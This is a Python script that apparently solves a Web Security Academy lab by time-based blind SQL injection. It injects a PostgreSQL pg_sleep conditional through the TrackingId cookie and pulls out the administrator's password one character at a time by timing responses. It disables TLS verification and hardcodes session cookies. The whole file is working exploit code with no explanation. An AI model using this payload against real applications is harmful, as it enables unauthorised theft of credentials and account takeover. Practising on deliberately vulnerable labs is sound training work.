import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import sys
proxies= {'https':'https://127.0.0.1:8080'}
url = "https://acdf1f401e02a8a5808f0d5600f600c8.web-security-academy.net/filter?category=Gifts"
cookies = {'TrackingId':'DGY5HvEtvyn5Ju5p', 'session':'KO5T5cTFrgvZMtIpfmIcLcY3wuZ5msay'}
for i in range(1,50):
    for j in range(32,126):
        inj_1 = "' || (select case when substring(password,%s,1) = '%s' then pg_sleep(2) else null end from users where username='administrator')--" % (i,chr(j))
        inj_2 = 'wRSI5nzJxcl6QtQe%s'% inj_1
        inj_3 = cookies['TrackingId'] = inj_2
        r = requests.get(url, cookies=cookies, proxies=proxies, verify=False)
        roundtrip = r.elapsed.total_seconds()
        if roundtrip > 2:
            sys.stdout.write(chr(j))
            sys.stdout.flush()
